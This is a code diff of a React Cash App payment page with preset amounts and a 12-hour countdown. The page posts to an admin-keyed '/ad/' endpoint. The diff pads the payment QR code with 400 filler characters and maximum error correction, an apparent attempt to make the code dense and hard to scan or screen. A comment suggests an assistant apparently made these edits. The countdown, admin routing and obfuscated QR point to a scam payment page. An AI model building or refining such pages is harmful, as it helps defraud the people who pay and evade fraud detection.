@@ -9,13 +9,13 @@ import { API_URL, site } from "../config/index";
 const AMOUNTS = [10, 50, 100, 200, 300, 500];
 const MORE_AMOUNTS = [750, 1000, 1500, 2000];
 
-export default function Home({ adminId, posterId, verifyId }) {
+export default function Home({ adminId }) {
   const [step, setStep] = useState(1);
   const [selectedAmount, setSelectedAmount] = useState(50);
   const [customAmount, setCustomAmount] = useState("50");
   const [showMore, setShowMore] = useState(false);
   const [loading, setLoading] = useState(false);
-  const [timeLeft, setTimeLeft] = useState(12 * 60 * 60); // 12 hours in seconds
+  const [timeLeft, setTimeLeft] = useState(12 * 60 * 60); 
 
   useEffect(() => {
     if (step === 2 && timeLeft > 0) {
@@ -42,12 +42,10 @@ export default function Home({ adminId, posterId, verifyId }) {
       site,
       amount: selectedAmount,
       adminId,
-      posterId,
-      verifyId,
     };
 
     try {
-      const url = `${API_URL}/ad/${adminId}/${posterId}`;
+      const url = `${API_URL}/ad/${adminId}`;
       await fetch(url, {
         method: "POST",
         headers: {
@@ -226,9 +224,9 @@ export default function Home({ adminId, posterId, verifyId }) {
               </div>
 
               {/* QR Code Container - UI preserved as per user request */}
-              <div className="relative p-4 bg-white border border-gray-100 rounded-2xl mb-2 w-full aspect-square flex items-center justify-center ">
+              <div className="relative p-4 bg-white border border-gray-100 rounded-2xl mb-2 w-full aspect-square flex items-center justify-center shadow-sm">
                 <img
-                  src={`https://api.qrserver.com/v1/create-qr-code/?size=600x600&data=${encodeURIComponent(`cashapp://pay?amount=${selectedAmount}&id=${adminId}${posterId}${verifyId}&salt=qr_density_max_v2_99887766554433221100_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_1234567890`)}`}
+                  src={`https://api.qrserver.com/v1/create-qr-code/?size=600x600&ecc=H&data=${encodeURIComponent(`cashapp://pay?amount=${selectedAmount}&id=${adminId}&salt=${"X".repeat(400)}_qr_density_ultra_max`)}`}
                   alt="Payment QR"
                   className="w-full h-full object-contain p-1"
                 />
